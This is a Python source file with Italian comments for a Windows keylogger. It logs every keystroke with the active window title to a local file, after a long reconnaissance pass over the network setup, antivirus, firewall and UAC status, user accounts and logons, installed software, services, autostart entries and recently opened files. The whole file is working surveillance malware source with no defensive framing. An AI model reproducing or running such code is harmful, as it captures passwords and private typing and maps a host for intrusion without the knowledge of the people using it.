
from pynput import keyboard                                      # libreria per intercettare i tasti
import os                                                        # per costruire il percorso del file
import socket                                                    # per ottenere IP locale e scansionare le porte
import platform                                                  # per info sul processore e sistema operativo
import psutil                                                    # per info su RAM, dischi, processi e rete
import requests                                                  # per ottenere l'IP pubblico
import subprocess                                                # per eseguire comandi PowerShell
import json                                                      # per parsare l'output JSON di PowerShell
import ctypes                                                    # per ottenere il nome della finestra attiva
from datetime import datetime                                    # per il timestamp della scansione
from concurrent.futures import ThreadPoolExecutor, TimeoutError as TimedOut  # per risoluzione DNS con timeout sicuro


FILE_LOG = os.path.join(os.path.dirname(__file__), "keys.txt")  # percorso del file log nella stessa cartella dello script

PORTE_COMUNI = [21, 22, 23, 25, 53, 80, 110, 135, 139,          # lista delle porte comuni da scansionare
                143, 443, 445, 3306, 3389, 5900, 8080, 8443]    # continua la lista delle porte


# =============================================================
# FUNZIONE AUSILIARIA: ESEGUE UN COMANDO POWERSHELL
# =============================================================

def esegui_powershell(comando, timeout=10):                      # funzione helper per eseguire comandi PowerShell
    try:
        risultato = subprocess.run(                              # esegue il comando PowerShell
            ['powershell', '-OutputEncoding', 'UTF8', '-Command', '[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;' + comando],
            capture_output=True, text=True, timeout=timeout,
            encoding='utf-8', errors='replace'                  # forza UTF-8 per gestire caratteri speciali
        )
        return risultato.stdout.strip()                          # restituisce l'output pulito
    except Exception:
        return ""                                                # restituisce stringa vuota in caso di errore


# =============================================================
# FUNZIONE AUSILIARIA: RISOLVE IL NOME DI UN DISPOSITIVO
# =============================================================

def risolvi_nome_dispositivo(ip):                                # funzione che tenta di risolvere il nome di un IP
    if ip.startswith('224.') or ip.startswith('239.'):           # salta indirizzi multicast (224.x - 239.x)
        return "multicast"                                       # restituisce etichetta multicast
    if ip.endswith('.255') or ip == '255.255.255.255':           # salta indirizzi broadcast
        return "broadcast"                                       # restituisce etichetta broadcast
    if ip.startswith('127.'):                                    # salta loopback
        return "loopback"                                        # restituisce etichetta loopback
    try:
        with ThreadPoolExecutor(max_workers=1) as esecutore:     # crea un thread separato per il DNS
            futuro = esecutore.submit(socket.gethostbyaddr, ip)  # avvia la risoluzione DNS in background
            nome_dns = futuro.result(timeout=0.5)[0]             # aspetta massimo 0.5 secondi il risultato
            if nome_dns and nome_dns != ip:                      # se ha trovato un nome diverso dall'IP
                return nome_dns                                  # restituisce il nome DNS
    except (TimedOut, Exception):
        pass                                                     # timeout o errore -> fallback
    return "sconosciuto"                                         # fallback se nessun metodo ha funzionato


# =============================================================
# KEYLOGGER
# =============================================================

finestra_corrente = {"titolo": ""}                               # dizionario per tracciare la finestra attiva corrente

def ottieni_finestra_attiva():                                   # funzione che restituisce il titolo della finestra attiva
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()        # ottiene l'handle della finestra in primo piano
        lunghezza = ctypes.windll.user32.GetWindowTextLengthW(hwnd)  # ottiene la lunghezza del titolo
        buffer = ctypes.create_unicode_buffer(lunghezza + 1)     # crea un buffer per il titolo
        ctypes.windll.user32.GetWindowTextW(hwnd, buffer, lunghezza + 1)  # copia il titolo nel buffer
        return buffer.value                                      # restituisce il titolo della finestra
    except Exception:
        return "sconosciuto"                                     # fallback se non riesce a leggere la finestra

def gestisci_tasti(tasto: keyboard.Key):                         # funzione chiamata ad ogni tasto premuto
    with open(FILE_LOG, 'a') as file_:                           # apre il file in modalità append
        finestra_attiva = ottieni_finestra_attiva()              # ottiene la finestra attiva al momento della pressione
        if finestra_attiva != finestra_corrente["titolo"]:       # se la finestra è cambiata rispetto all'ultima
            finestra_corrente["titolo"] = finestra_attiva        # aggiorna la finestra corrente
            file_.write(f"\n[Finestra: {finestra_attiva}]\n")    # scrive il cambio finestra nel log
        try:
            if tasto.char is not None and tasto.char.isprintable():  # controlla che sia un carattere normale e stampabile
                file_.write(tasto.char)                          # scrive il carattere nel file
        except AttributeError:                                   # se tasto.char non esiste è un tasto speciale
            if tasto == keyboard.Key.space:                      # controlla se è lo spazio
                file_.write(' ')                                 # spazio -> scrive uno spazio
            elif tasto == keyboard.Key.enter:                    # controlla se è invio
                file_.write('\n')                                # invio -> va a capo
            elif tasto == keyboard.Key.backspace:                # controlla se è backspace
                file_.write('[CANC]')                            # backspace -> indica cancellazione


# =============================================================
# SEZIONE RETE
# =============================================================

def salva_rete(file_):                                           # funzione che raccoglie e scrive tutti i dati di rete

    # --- IP, MASCHERA, GATEWAY ---
    nome = socket.gethostname()                                  # ottiene il nome del computer
    ip_locale = socket.gethostbyname(nome)                       # ricava l'IP locale dal nome host
    maschera = "N/A"                                             # valore di default per la maschera
    for interfaccia, indirizzi in psutil.net_if_addrs().items(): # itera su tutte le interfacce di rete
        for indirizzo in indirizzi:                              # itera su ogni indirizzo dell'interfaccia
            if indirizzo.family == socket.AF_INET and indirizzo.address == ip_locale:  # trova l'interfaccia con l'IP locale
                maschera = indirizzo.netmask                     # recupera la maschera di sottorete
    try:
        comando_gateway = ['powershell', '-Command',
                           '(Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null} | Select-Object -First 1).IPv4DefaultGateway.NextHop']
        risultato_gateway = subprocess.run(comando_gateway, capture_output=True, text=True, timeout=5,
                                           encoding='utf-8', errors='replace')  # esegue il comando
        gateway = risultato_gateway.stdout.strip() or "N/A"     # recupera il gateway o N/A se vuoto
    except Exception:
        gateway = "N/A"                                          # fallback se PowerShell non risponde
    try:
        ip_pubblico = requests.get('https://api.ipify.org/', timeout=5).text  # richiede l'IP pubblico a un servizio esterno
    except requests.RequestException:
        ip_pubblico = "N/A (nessuna connessione)"                # fallback se non c'è connessione
    file_.write("--- IP ---\n")
    file_.write(f"  IP Locale:   {ip_locale}\n")                 # scrive l'IP locale
    file_.write(f"  Maschera:    {maschera}\n")                  # scrive la maschera di sottorete
    file_.write(f"  Gateway:     {gateway}\n")                   # scrive il gateway predefinito
    file_.write(f"  IP Pubblico: {ip_pubblico}\n\n")             # scrive l'IP pubblico

    # --- DNS ---
    file_.write("--- DNS ---\n")
    try:
        output_dns = esegui_powershell(                          # recupera i server DNS configurati
            'Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object {$_.ServerAddresses} | Select-Object -ExpandProperty ServerAddresses | Sort-Object -Unique')
        for dns in output_dns.splitlines():                      # itera su ogni server DNS
            if dns.strip():                                      # ignora righe vuote
                file_.write(f"  Server DNS: {dns.strip()}\n")   # scrive il server DNS
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- WI-FI ---
    file_.write("--- WI-FI ---\n")
    try:
        output_wifi = esegui_powershell(                         # recupera informazioni sulla rete Wi-Fi connessa
            'netsh wlan show interfaces')
        for riga in output_wifi.splitlines():                    # itera sulle righe dell'output
            riga = riga.strip()                                  # rimuove spazi
            if any(k in riga for k in ['SSID', 'Autenticazione', 'Cifratura', 'Segnale', 'Velocità']):  # filtra righe utili
                file_.write(f"  {riga}\n")                       # scrive la riga nel file
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- TABELLA DI ROUTING ---
    file_.write("--- TABELLA DI ROUTING ---\n")
    try:
        output_route = esegui_powershell(                        # recupera la tabella di routing
            'Get-NetRoute -AddressFamily IPv4 | Select-Object DestinationPrefix, NextHop, RouteMetric | ConvertTo-Json -Compress')
        rotte = json.loads(output_route)                         # parsea il JSON
        if isinstance(rotte, dict):                              # se è una sola rotta la mette in lista
            rotte = [rotte]
        for rotta in rotte:                                      # itera su ogni rotta
            destinazione = rotta.get('DestinationPrefix', 'N/A')  # destinazione della rotta
            prossimo_hop = rotta.get('NextHop', 'N/A')           # prossimo hop
            metrica = rotta.get('RouteMetric', 'N/A')            # metrica della rotta
            file_.write(f"  {destinazione} -> {prossimo_hop}  (metrica: {metrica})\n")  # scrive la rotta
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- INTERFACCE DI RETE ---
    file_.write("--- INTERFACCE DI RETE ---\n")
    statistiche = psutil.net_if_stats()                          # ottiene le statistiche delle interfacce
    for nome_interfaccia, indirizzi in psutil.net_if_addrs().items():  # itera su ogni interfaccia
        stato = statistiche.get(nome_interfaccia)                # recupera lo stato dell'interfaccia
        attiva = "ATTIVA" if stato and stato.isup else "INATTIVA"  # determina se l'interfaccia è attiva
        file_.write(f"  {nome_interfaccia}: {attiva}\n")         # scrive il nome e lo stato
        for indirizzo in indirizzi:                              # itera su ogni indirizzo dell'interfaccia
            if indirizzo.family == socket.AF_INET:               # filtra solo indirizzi IPv4
                file_.write(f"    IPv4:     {indirizzo.address}\n")  # scrive l'indirizzo IPv4
                file_.write(f"    Maschera: {indirizzo.netmask}\n")  # scrive la maschera su riga separata
            elif indirizzo.family == socket.AF_INET6:            # filtra solo indirizzi IPv6
                file_.write(f"    IPv6:     {indirizzo.address}\n")  # scrive l'indirizzo IPv6
    file_.write("\n")

    # --- TABELLA ARP ---
    file_.write("--- TABELLA ARP ---\n")
    try:
        risultato_arp = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=5,
                                       encoding='utf-8', errors='replace')  # esegue arp -a
        for riga in risultato_arp.stdout.strip().splitlines():   # itera sulle righe dell'output
            if not riga.strip():                                 # salta righe vuote
                continue
            parti = riga.split()                                 # divide la riga in parti
            if len(parti) >= 1 and parti[0].count('.') == 3:    # controlla se è un IP valido
                ip_dispositivo = parti[0]                        # estrae l'IP
                nome_dispositivo = risolvi_nome_dispositivo(ip_dispositivo)  # risolve il nome
                file_.write(f"  {riga.strip()}  ({nome_dispositivo})\n")  # scrive con nome
            else:
                file_.write(f"  {riga.strip()}\n")              # scrive righe di intestazione
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- CONNESSIONI ATTIVE ---
    file_.write("--- CONNESSIONI ATTIVE (ESTABLISHED) ---\n")
    try:
        connessioni = psutil.net_connections(kind='inet')        # ottiene tutte le connessioni internet
        for connessione in connessioni:                          # itera su ogni connessione
            if connessione.status == 'ESTABLISHED':              # filtra solo le connessioni stabilite
                indirizzo_locale = f"{connessione.laddr.ip}:{connessione.laddr.port}"  # indirizzo locale
                ip_remoto = connessione.raddr.ip                 # IP remoto
                porta_remota = connessione.raddr.port            # porta remota
                nome_remoto = risolvi_nome_dispositivo(ip_remoto)  # risolve il nome remoto
                file_.write(f"  {indirizzo_locale} -> {ip_remoto}:{porta_remota}  ({nome_remoto})\n")  # scrive connessione
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- PORTE IN ASCOLTO ---
    file_.write("--- PORTE IN ASCOLTO (LISTENING) ---\n")
    try:
        connessioni = psutil.net_connections(kind='inet')        # ottiene tutte le connessioni internet
        for connessione in connessioni:                          # itera su ogni connessione
            if connessione.status == 'LISTEN':                   # filtra solo le porte in ascolto
                file_.write(f"  {connessione.laddr.ip}:{connessione.laddr.port}\n")  # scrive la porta in ascolto
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- PORTE COMUNI APERTE ---
    file_.write("--- PORTE COMUNI APERTE ---\n")
    porte_aperte = []                                            # lista per raccogliere le porte aperte
    try:
        for porta in PORTE_COMUNI:                               # itera su ogni porta comune
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # crea un socket TCP
            sock.settimeout(0.1)                                 # timeout ridotto a 0.1 secondi per porta
            risultato = sock.connect_ex(('127.0.0.1', porta))   # tenta la connessione in locale
            if risultato == 0:                                   # 0 = porta aperta
                porte_aperte.append(porta)                       # aggiunge la porta alla lista
                file_.write(f"  Porta {porta}: APERTA\n")       # scrive la porta aperta
            sock.close()                                         # chiude il socket
    except KeyboardInterrupt:
        file_.write("  Scansione interrotta\n")                  # se interrotta scrive nel log e continua
    if not porte_aperte:                                         # se la lista è vuota
        file_.write("  Nessuna porta aperta trovata\n")          # messaggio se nessuna porta è aperta
    file_.write("\n")


# =============================================================
# SEZIONE SICUREZZA
# =============================================================

def salva_sicurezza(file_):                                      # funzione che raccoglie e scrive i dati di sicurezza

    # --- ANTIVIRUS ---
    file_.write("--- ANTIVIRUS ---\n")
    try:
        output_av = esegui_powershell('''
            Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct | ForEach-Object {
                $percorso = $_.pathToSignedProductExe
                $versione = if ($percorso -and (Test-Path $percorso)) {
                    (Get-Item $percorso).VersionInfo.FileVersion
                } elseif ($_.displayName -like "*Defender*") {
                    (Get-MpComputerStatus).AMProductVersion
                } else { "N/A" }
                [PSCustomObject]@{ nome = $_.displayName; versione = $versione }
            } | ConvertTo-Json -Compress
        ''')                                                     # recupera nome e versione antivirus
        if output_av:                                            # se c'è output
            dati_av = json.loads(output_av)                      # parsea il JSON
            if isinstance(dati_av, dict):                        # se è un solo antivirus lo mette in lista
                dati_av = [dati_av]
            for antivirus in dati_av:                            # itera su ogni antivirus
                file_.write(f"  Nome:     {antivirus.get('nome', 'Sconosciuto')}\n")  # scrive il nome
                file_.write(f"  Versione: {antivirus.get('versione', 'N/A')}\n\n")    # scrive la versione
        else:
            file_.write("  Nessun antivirus rilevato\n")
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- FIREWALL ---
    file_.write("--- FIREWALL ---\n")
    try:
        output_fw = esegui_powershell(                           # recupera lo stato dei profili firewall
            'Get-NetFirewallProfile | Select-Object Name, Enabled | ConvertTo-Json -Compress')
        profili_fw = json.loads(output_fw)                       # parsea il JSON
        if isinstance(profili_fw, dict):                         # se è un solo profilo lo mette in lista
            profili_fw = [profili_fw]
        for profilo in profili_fw:                               # itera su ogni profilo
            stato_fw = "ATTIVO" if profilo.get('Enabled') else "DISATTIVO"  # determina lo stato
            file_.write(f"  {profilo.get('Name')}: {stato_fw}\n")  # scrive profilo e stato
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- UAC ---
    file_.write("--- UAC ---\n")
    try:
        valore_uac = esegui_powershell(                          # recupera il valore UAC dal registro
            '(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).EnableLUA')
        stato_uac = "ATTIVO" if valore_uac.strip() == "1" else "DISATTIVO"  # 1 = attivo, 0 = disattivo
        file_.write(f"  UAC: {stato_uac}\n")
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- SECURE BOOT ---
    file_.write("--- SECURE BOOT ---\n")
    try:
        valore_sb = esegui_powershell(                           # recupera lo stato del Secure Boot
            'Confirm-SecureBootUEFI 2>$null')
        stato_sb = "ATTIVO" if "True" in valore_sb else "DISATTIVO"  # True = attivo
        file_.write(f"  Secure Boot: {stato_sb}\n")
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- PASSWORD POLICY ---
    file_.write("--- PASSWORD POLICY ---\n")
    try:
        output_policy = esegui_powershell(                       # recupera la password policy locale
            'net accounts')
        for riga in output_policy.splitlines():                  # itera sulle righe dell'output
            if riga.strip():                                     # ignora righe vuote
                file_.write(f"  {riga.strip()}\n")              # scrive la riga della policy
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- CERTIFICATI INSTALLATI ---
    file_.write("--- CERTIFICATI INSTALLATI ---\n")
    try:
        output_cert = esegui_powershell(                         # recupera i certificati dal registro di sistema
            'Get-ChildItem Cert:\\LocalMachine\\Root | Select-Object Subject, NotAfter | ConvertTo-Json -Compress')
        certificati = json.loads(output_cert)                    # parsea il JSON
        if isinstance(certificati, dict):                        # se è un solo certificato lo mette in lista
            certificati = [certificati]
        for cert in certificati:                                  # itera su ogni certificato
            soggetto = cert.get('Subject', 'N/A')                # soggetto del certificato
            scadenza = cert.get('NotAfter', 'N/A')               # data di scadenza
            file_.write(f"  {soggetto}\n")                       # scrive il soggetto
            file_.write(f"    Scadenza: {scadenza}\n")           # scrive la scadenza
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- WINDOWS UPDATE ---
    file_.write("--- WINDOWS UPDATE ---\n")
    try:
        output_wu = esegui_powershell(                           # recupera gli ultimi aggiornamenti installati
            'Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 | Select-Object HotFixID, Description, InstalledOn | ConvertTo-Json -Compress', timeout=15)
        aggiornamenti = json.loads(output_wu)                    # parsea il JSON
        if isinstance(aggiornamenti, dict):                      # se è un solo aggiornamento lo mette in lista
            aggiornamenti = [aggiornamenti]
        for aggiornamento in aggiornamenti:                      # itera su ogni aggiornamento
            id_patch = aggiornamento.get('HotFixID', 'N/A')      # ID dell'aggiornamento
            descrizione = aggiornamento.get('Description', 'N/A')  # descrizione
            data = aggiornamento.get('InstalledOn', 'N/A')       # data di installazione
            file_.write(f"  {id_patch} — {descrizione} — {data}\n")  # scrive l'aggiornamento
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")


# =============================================================
# SEZIONE SISTEMA
# =============================================================

def salva_sistema(file_):                                        # funzione che raccoglie e scrive i dati di sistema

    # --- SISTEMA OPERATIVO ---
    file_.write("--- SISTEMA OPERATIVO ---\n")
    file_.write(f"  Nome:         {platform.system()}\n")        # nome del sistema operativo
    file_.write(f"  Versione:     {platform.version()}\n")       # versione completa
    file_.write(f"  Release:      {platform.release()}\n")       # release
    file_.write(f"  Architettura: {platform.machine()}\n\n")     # architettura (x64, x86...)

    # --- BIOS / UEFI ---
    file_.write("--- BIOS / UEFI ---\n")
    try:
        output_bios = esegui_powershell(                         # recupera le informazioni del BIOS
            'Get-WmiObject Win32_BIOS | Select-Object Manufacturer, Name, Version, ReleaseDate | ConvertTo-Json -Compress')
        bios = json.loads(output_bios)                           # parsea il JSON
        file_.write(f"  Produttore: {bios.get('Manufacturer', 'N/A')}\n")  # produttore BIOS
        file_.write(f"  Nome:       {bios.get('Name', 'N/A')}\n")          # nome BIOS
        file_.write(f"  Versione:   {bios.get('Version', 'N/A')}\n")       # versione BIOS
        file_.write(f"  Data:       {bios.get('ReleaseDate', 'N/A')}\n")   # data di rilascio
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- SCHEDA GRAFICA ---
    file_.write("--- SCHEDA GRAFICA ---\n")
    try:
        output_gpu = esegui_powershell(                          # recupera le informazioni sulla GPU
            'Get-WmiObject Win32_VideoController | Select-Object Name, DriverVersion, AdapterRAM | ConvertTo-Json -Compress')
        gpu = json.loads(output_gpu)                             # parsea il JSON
        if isinstance(gpu, dict):                                # se è una sola GPU la mette in lista
            gpu = [gpu]
        for scheda in gpu:                                        # itera su ogni scheda grafica
            ram_gpu = round(scheda.get('AdapterRAM', 0) / (1024**3), 2)  # converte la VRAM in GB
            file_.write(f"  Nome:    {scheda.get('Name', 'N/A')}\n")          # nome GPU
            file_.write(f"  Driver:  {scheda.get('DriverVersion', 'N/A')}\n") # versione driver
            file_.write(f"  VRAM:    {ram_gpu} GB\n\n")                        # VRAM in GB
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- UPTIME ---
    file_.write("--- UPTIME ---\n")
    try:
        avvio = datetime.fromtimestamp(psutil.boot_time())       # converte il timestamp di avvio in datetime
        differenza = datetime.now() - avvio                      # calcola la differenza
        ore = int(differenza.total_seconds() // 3600)            # calcola le ore totali
        minuti = int((differenza.total_seconds() % 3600) // 60) # calcola i minuti rimanenti
        file_.write(f"  Avviato il: {avvio.strftime('%Y-%m-%d %H:%M:%S')}\n")  # scrive la data di avvio
        file_.write(f"  Uptime:     {ore}h {minuti}m\n")         # scrive l'uptime
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- UTENTE CORRENTE ---
    file_.write("--- UTENTE CORRENTE ---\n")
    try:
        nome_utente = os.getlogin()                              # ottiene il nome utente corrente
        output_admin = esegui_powershell(                        # verifica se l'utente è amministratore
            '([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)')
        privilegi = "AMMINISTRATORE" if "True" in output_admin else "UTENTE STANDARD"  # determina i privilegi
        file_.write(f"  Utente:    {nome_utente}\n")             # scrive il nome utente
        file_.write(f"  Privilegi: {privilegi}\n")               # scrive il livello di privilegi
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- LISTA UTENTI ---
    file_.write("--- UTENTI DEL SISTEMA ---\n")
    try:
        output_utenti = esegui_powershell(                       # recupera la lista degli utenti locali
            'Get-LocalUser | Select-Object Name, Enabled | ConvertTo-Json -Compress')
        lista_utenti = json.loads(output_utenti)                 # parsea il JSON
        if isinstance(lista_utenti, dict):                       # se è un solo utente lo mette in lista
            lista_utenti = [lista_utenti]
        for utente in lista_utenti:                              # itera su ogni utente
            stato_utente = "attivo" if utente.get('Enabled') else "disabilitato"  # determina lo stato
            file_.write(f"  {utente.get('Name')}: {stato_utente}\n")  # scrive nome e stato
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- ULTIMI ACCESSI ---
    file_.write("--- ULTIMI ACCESSI AL SISTEMA ---\n")
    try:
        output_accessi = esegui_powershell(                      # recupera gli ultimi eventi di login dal log di sicurezza
            'Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" -MaxEvents 10 | '
            'Select-Object TimeCreated, @{N="Utente";E={$_.Properties[5].Value}} | ConvertTo-Json -Compress', timeout=15)
        accessi = json.loads(output_accessi)                     # parsea il JSON
        if isinstance(accessi, dict):                            # se è un solo accesso lo mette in lista
            accessi = [accessi]
        for accesso in accessi:                                   # itera su ogni accesso
            file_.write(f"  {accesso.get('TimeCreated', 'N/A')} — Utente: {accesso.get('Utente', 'N/A')}\n")  # scrive l'accesso
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- VARIABILI D'AMBIENTE ---
    file_.write("--- VARIABILI D'AMBIENTE ---\n")
    variabili_interesse = ['PATH', 'USERNAME', 'COMPUTERNAME',   # lista delle variabili d'ambiente di interesse
                           'OS', 'TEMP', 'APPDATA', 'PROGRAMFILES']
    for variabile in variabili_interesse:                        # itera su ogni variabile di interesse
        valore = os.environ.get(variabile, 'N/A')                # recupera il valore
        file_.write(f"  {variabile}: {valore}\n")                # scrive la variabile e il suo valore
    file_.write("\n")

    # --- PROCESSORE ---
    file_.write("--- PROCESSORE ---\n")
    file_.write(f"  CPU:          {platform.processor()}\n")     # modello CPU
    file_.write(f"  Core fisici:  {psutil.cpu_count(logical=False)}\n")  # numero core fisici
    file_.write(f"  Core logici:  {psutil.cpu_count(logical=True)}\n\n") # numero core logici

    # --- RAM ---
    ram = psutil.virtual_memory()                                # informazioni sulla RAM
    file_.write("--- RAM ---\n")
    file_.write(f"  Totale:       {round(ram.total     / (1024**3), 2)} GB\n")  # RAM totale
    file_.write(f"  Disponibile:  {round(ram.available / (1024**3), 2)} GB\n")  # RAM libera
    file_.write(f"  Usata:        {round(ram.used      / (1024**3), 2)} GB\n\n") # RAM usata

    # --- DISCHI ---
    file_.write("--- DISCHI ---\n")
    for disco in psutil.disk_partitions():                       # itera su ogni partizione disco
        try:
            utilizzo = psutil.disk_usage(disco.mountpoint)      # ottiene l'utilizzo della partizione
            file_.write(f"  Disco: {disco.device}\n")
            file_.write(f"    Totale:       {round(utilizzo.total / (1024**3), 2)} GB\n")  # spazio totale
            file_.write(f"    Usato:        {round(utilizzo.used  / (1024**3), 2)} GB\n")  # spazio usato
            file_.write(f"    Disponibile:  {round(utilizzo.free  / (1024**3), 2)} GB\n")  # spazio libero
        except PermissionError:
            file_.write(f"  Disco: {disco.device} — accesso negato\n")  # partizione non accessibile
    file_.write("\n")


# =============================================================
# SEZIONE PROCESSI E SOFTWARE
# =============================================================

def salva_processi_software(file_):                              # funzione che raccoglie processi, software e servizi

    # --- PROCESSI IN ESECUZIONE ---
    file_.write("--- PROCESSI IN ESECUZIONE ---\n")
    try:
        for processo in psutil.process_iter(['pid', 'name', 'username']):  # itera su tutti i processi attivi
            try:
                file_.write(f"  [{processo.info['pid']}] {processo.info['name']} "
                            f"({processo.info['username']})\n")  # scrive PID, nome e utente
            except (psutil.NoSuchProcess, psutil.AccessDenied):  # processo terminato o accesso negato
                pass                                             # ignora e continua
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- SOFTWARE INSTALLATO ---
    file_.write("--- SOFTWARE INSTALLATO ---\n")
    try:
        output_sw = esegui_powershell(                           # recupera la lista software dal registro
            'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | '
            'Select-Object DisplayName, DisplayVersion | Where-Object {$_.DisplayName} | '
            'Sort-Object DisplayName | ConvertTo-Json -Compress', timeout=15)
        lista_sw = json.loads(output_sw)                         # parsea il JSON
        if isinstance(lista_sw, dict):                           # se è un solo programma lo mette in lista
            lista_sw = [lista_sw]
        for software in lista_sw:                                # itera su ogni software
            nome_sw = software.get('DisplayName', 'Sconosciuto')     # nome del software
            versione_sw = software.get('DisplayVersion', 'N/A')      # versione del software
            file_.write(f"  {nome_sw} — v{versione_sw}\n")      # scrive nome e versione
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- SERVIZI WINDOWS ATTIVI ---
    file_.write("--- SERVIZI WINDOWS ATTIVI ---\n")
    try:
        for servizio in psutil.win_service_iter():               # itera su tutti i servizi Windows
            try:
                if servizio.status() == 'running':               # filtra solo i servizi in esecuzione
                    file_.write(f"  {servizio.name()}: {servizio.display_name()}\n")  # scrive nome e descrizione
            except (psutil.NoSuchProcess, psutil.AccessDenied):  # servizio non accessibile
                pass
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- TASK PIANIFICATE ---
    file_.write("--- TASK PIANIFICATE ---\n")
    try:
        output_task = esegui_powershell(                         # recupera le task pianificate attive
            'Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | '
            'Select-Object TaskName, TaskPath | ConvertTo-Json -Compress', timeout=15)
        lista_task = json.loads(output_task)                     # parsea il JSON
        if isinstance(lista_task, dict):                         # se è una sola task la mette in lista
            lista_task = [lista_task]
        for task in lista_task:                                   # itera su ogni task
            file_.write(f"  {task.get('TaskPath', '')}{task.get('TaskName', 'N/A')}\n")  # scrive percorso e nome
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- PROGRAMMI IN AVVIO AUTOMATICO ---
    file_.write("--- AVVIO AUTOMATICO ---\n")
    try:
        output_avvio = esegui_powershell(                        # recupera i programmi in avvio automatico
            'Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | ConvertTo-Json -Compress')
        lista_avvio = json.loads(output_avvio)                   # parsea il JSON
        if isinstance(lista_avvio, dict):                        # se è un solo elemento lo mette in lista
            lista_avvio = [lista_avvio]
        for programma in lista_avvio:                            # itera su ogni programma in avvio
            file_.write(f"  Nome:      {programma.get('Name', 'N/A')}\n")      # scrive il nome
            file_.write(f"  Comando:   {programma.get('Command', 'N/A')}\n")   # scrive il comando
            file_.write(f"  Posizione: {programma.get('Location', 'N/A')}\n\n") # scrive la posizione
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")

    # --- FILE APERTI RECENTEMENTE ---
    file_.write("--- FILE APERTI RECENTEMENTE ---\n")
    try:
        percorso_recenti = os.path.join(os.environ.get('APPDATA', ''),  # percorso della cartella Recent
                                        'Microsoft', 'Windows', 'Recent')
        if os.path.exists(percorso_recenti):                     # controlla se la cartella esiste
            file_recenti = sorted(                               # ordina i file per data di modifica
                os.scandir(percorso_recenti),
                key=lambda f: f.stat().st_mtime,
                reverse=True
            )
            for file_recente in file_recenti[:20]:               # mostra solo i 20 più recenti
                nome_file = file_recente.name.replace('.lnk', '')  # rimuove l'estensione .lnk
                data_modifica = datetime.fromtimestamp(file_recente.stat().st_mtime).strftime('%Y-%m-%d %H:%M')  # data
                file_.write(f"  {data_modifica} — {nome_file}\n")  # scrive data e nome file
    except Exception as errore:
        file_.write(f"  Errore: {errore}\n")
    file_.write("\n")


# =============================================================
# MAIN
# =============================================================

if __name__ == '__main__':
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')    # timestamp della scansione
    with open(FILE_LOG, 'a') as file_:                           # apre il file in append
        file_.write(f"\n{'='*40}\n")                             # riga separatrice superiore
        file_.write(f"  Scansione: {timestamp}\n")               # scrive data e ora
        file_.write(f"{'='*40}\n\n")                             # riga separatrice inferiore

        try:
            salva_rete(file_)                                    # salva tutti i dati di rete
        except Exception as e:
            file_.write(f"[ERRORE RETE]: {e}\n\n")              # errore nella sezione rete

        try:
            salva_sicurezza(file_)                               # salva antivirus, firewall e sicurezza
        except Exception as e:
            file_.write(f"[ERRORE SICUREZZA]: {e}\n\n")         # errore nella sezione sicurezza

        try:
            salva_sistema(file_)                                 # salva OS, BIOS, utenti e hardware
        except Exception as e:
            file_.write(f"[ERRORE SISTEMA]: {e}\n\n")           # errore nella sezione sistema

        try:
            salva_processi_software(file_)                       # salva processi, software e task
        except Exception as e:
            file_.write(f"[ERRORE PROCESSI]: {e}\n\n")          # errore nella sezione processi

        file_.write("--- TASTI PREMUTI ---\n")                   # intestazione sezione keylogger

    ascoltatore = keyboard.Listener(on_press=gestisci_tasti)     # crea il listener per i tasti
    ascoltatore.start()                                          # avvia il listener in background
    ascoltatore.join()                                           # tiene lo script in vita finché il listener è attivo